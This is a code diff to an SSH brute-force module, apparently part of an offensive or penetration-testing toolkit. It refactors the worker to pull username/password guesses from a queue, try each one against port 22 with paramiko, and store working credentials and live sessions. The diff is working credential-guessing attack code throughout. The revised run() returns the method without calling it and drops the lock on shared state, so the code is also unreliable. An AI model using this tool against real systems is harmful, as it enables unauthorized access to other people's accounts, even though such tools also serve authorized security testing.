@@ -14,36 +14,33 @@ class Sshbruteforce(_Bruteforce):
         super(Sshbruteforce, self).__init__()
         self.single_port = 22
 
-    def worker(self, user, password):
-        time.sleep(1)
+    def worker(self):
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        try:
-            client.connect(hostname=self.host, port=self.single_port, username=user, password=password)
-            self.print_result(user, password, error=False)
-            self.lock.acquire()
-            self.add_credential(user, password, "ssh")
-            self.add_session(client, user, "ssh")
-            self.lock.release()
-        except Exception as e:
-            if "is not subscriptable" in str(e):
-                print("No SSH service")
-                self.num_threads -= 1
-                self.error += 1
-                sys.exit(0)
-            if(self.verb):
-               self.print_result(user,password, error=True)
+        while(not self.tasks_queue.empty()):
+            task = self.tasks_queue.get()
+            if task is None:
+                break
             try:
-                client.close()
-            except:
-                pass
-        self.num_threads -= 1
-        sys.exit(0)
+                client.connect(hostname=self.host, port=self.single_port, username=task["user"], password=task["password"], banner_timeout=2, timeout=2)
+                self.print_result(task["user"], task["password"], error=False)
+                self.add_credential(task["user"], task["password"], "ssh")
+                self.add_session(client, task["user"], "ssh")
+            except Exception as e:
+                if "is not subscriptable" in str(e):
+                    print("No SSH service")
+                    break
+                if (self.verb):
+                    self.print_result(task["user"], task["password"], error=True)
+                try:
+                    client.close()
+                except:
+                    pass
+            self.tasks_queue.task_done()
 
     def run(self):
         if (not hasParamiko):
             print("✕  It's required install paramiko")
             return
 
-        super(Sshbruteforce, self).run()
-        return self.sessions, self.credentials
+        return super(Sshbruteforce, self).run
